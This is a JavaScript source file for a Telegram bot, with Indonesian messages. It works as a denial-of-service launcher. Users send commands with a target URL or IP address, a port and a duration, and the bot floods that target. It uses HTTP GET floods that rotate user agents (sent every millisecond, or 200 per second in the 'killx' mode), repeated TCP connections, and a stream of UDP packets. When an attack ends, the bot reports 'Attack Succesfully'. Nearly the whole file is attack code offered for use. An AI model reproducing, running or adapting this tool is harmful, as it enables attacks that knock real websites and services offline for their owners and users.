require('./setting')
const TelegramBot = require('node-telegram-bot-api');
const colors = require('colors');
const axios = require('axios')
const fs = require('fs');
const dgram = require("dgram");
const net = require('net');
const token = global.token;
const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const options = {
    reply_markup: {
      keyboard: [
        [{ text: "Layer7 - Flood" }, { text: "Layer7 - KillX" }],
        [{ text: "Layer4 - Tcp" }, { text: "Layer4 - Udp" }],
        [{ text: "Tutup" }]
      ],
      resize_keyboard: true
    }
  };
  bot.sendMessage(chatId, "#", options);
});
bot.on("message", (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  if (text === "Layer7 - Flood") {
    bot.sendMessage(chatId, "Example: \n /flood <url> <duration>");
    
  } else if (text === "Layer7 - KillX") {
    bot.sendMessage(chatId, "Example: \n /killx <url> <duration>");
    
  } else if (text === "Layer4 - Tcp") {
    bot.sendMessage(chatId, "Example: \n /tcp <address> <port> <duration>");
    
  } else if (text === "Layer4 - Udp") {
    bot.sendMessage(chatId, "Example: \n /udp <addres> <port> <durarion>.", {
    });
    
  } else if (text === "Tutup") {
    bot.sendMessage(chatId, "Succesfully.", {
      reply_markup: { remove_keyboard: true }
    });
    
  }
});




bot.onText(/\/flood (.+) (\d+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const targetUrl = match[1]; // URL target
  const duration = parseInt(match[2], 10);
  if (isNaN(duration) || duration <= 0) {
    bot.sendMessage(chatId, 'Durasi tidak valid! Gunakan angka yang benar.');
    return;
  }
  bot.sendMessage(chatId, `🚀`);
  startDDoSAttack(chatId, targetUrl, duration);
});
function getUserAgent() {
  const uaList = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
  const randomIndex = Math.floor(Math.random() * uaList.length);
  return uaList[randomIndex];
}
function startDDoSAttack(chatId, targetUrl, duration) {
  const attackInterval = setInterval(() => {
    const userAgent = getUserAgent();
    axios.get(targetUrl, {
      headers: {
        'User-Agent': userAgent
      }
    })
      .then(response => {
        console.log(`Request ke ${targetUrl} diterima dengan status ${response.status}`);
      })
      .catch(error => {
        console.error(`Error saat mencoba serangan: ${error.message}`);
      });
  }, 1);
  setTimeout(() => {
    clearInterval(attackInterval);
    const p = `
Attack Succesfully !
• Target : ${targetUrl}
• Duration : ${duration}
• Attack type : Flood

Script by @zensusid
`
    bot.sendMessage(chatId, p);
  }, duration * 1000);
}

function tcpFlood(targetIp, targetPort, duration) {
    let durationInMs = duration * 1000;
    let startTime = Date.now();
    let stopTime = startTime + durationInMs;
    console.log(`Starting TCP flood on ${targetIp}:${targetPort} for ${duration} seconds...`);
    function flood() {
        const socket = new net.Socket();
        socket.connect(targetPort, targetIp, () => {
            socket.write('GET / HTTP/1.1\r\n');
            socket.write('Host: ' + targetIp + '\r\n');
            socket.write('\r\n');
        });
        socket.on('data', (data) => {
        });
        socket.on('error', (err) => {
            console.log('Error:', err.message);
        });
        socket.on('close', () => {
            if (Date.now() < stopTime) {
                flood();
            }
        });
    }
    flood();
    setTimeout(() => {
        console.log('Flooding stopped');
    }, durationInMs);
}

bot.onText(/\/tcp (\S+) (\d+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const targetIp = match[1];
    const targetPort = parseInt(match[2], 10);
    const duration = parseInt(match[3], 10);
    if (duration > 80) {
        bot.sendMessage(chatId, 'Durasi maksimal adalah 80 detik!');
        return;
    }
    bot.sendMessage(chatId, `🚀
    `);
    tcpFlood(targetIp, targetPort, duration);
});


bot.onText(/\/udp (.+) (.+) (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const targetIP = match[1];
    const targetPort = parseInt(match[2]);
    let duration = parseInt(match[3]);
    if (isNaN(targetPort) || isNaN(duration) || targetPort <= 0 || duration <= 0) {
        return bot.sendMessage(chatId, "❌ Format salah! Gunakan: /udp <Addres> <port> <duration>");
    }

    if (duration > 80) {
        duration = 80;
    }

    bot.sendMessage(chatId, `🚀`);
    const client = dgram.createSocket("udp4");
    const packet = Buffer.alloc(1024, "A");
    const attackInterval = setInterval(() => {
        client.send(packet, 0, packet.length, targetPort, targetIP, (err) => {
            if (err) {
                console.error(`❌ Gagal mengirim paket ke ${targetIP}:${targetPort}`);
            }
        });
    }, 10);
    setTimeout(() => {
        clearInterval(attackInterval);
        client.close();
        bot.sendMessage(chatId, `✅ Serangan UDP ke ${targetIP}:${targetPort} selesai.`);
    }, duration * 1000);
});

bot.onText(/\/killx (.+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const url = match[1];
    const duration = parseInt(match[2]);
    if (!url.startsWith("http")) {
        return bot.sendMessage(chatId, "🛑 URL tidak valid! Harus dimulai dengan http atau https.");
    }
    if (isNaN(duration) || duration <= 0) {
        return bot.sendMessage(chatId, "🛑 Durasi tidak valid");
    }
    bot.sendMessage(chatId, `🚀`);
    const endTime = Date.now() + duration * 1000;
    let attackCount = 0;
    const attack = async () => {
        if (Date.now() > endTime) {
            bot.sendMessage(chatId, `Total request: ${attackCount}`);
            return;
        }
        for (let i = 0; i < 200; i++) {
            axios
                .get(url, {
                    headers: {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    },
                })
                .then(() => {
                    attackCount++;
                    console.log(`🔫 Menyerang ${url} - Total: ${attackCount}`);
                })
                .catch(() => {
                    console.log(`Udah down`);
                });
        }

        setTimeout(attack, 1000); // 200 request per detik
    };

    attack();
});



console.log(colors.cyan.bold('Starting...'));
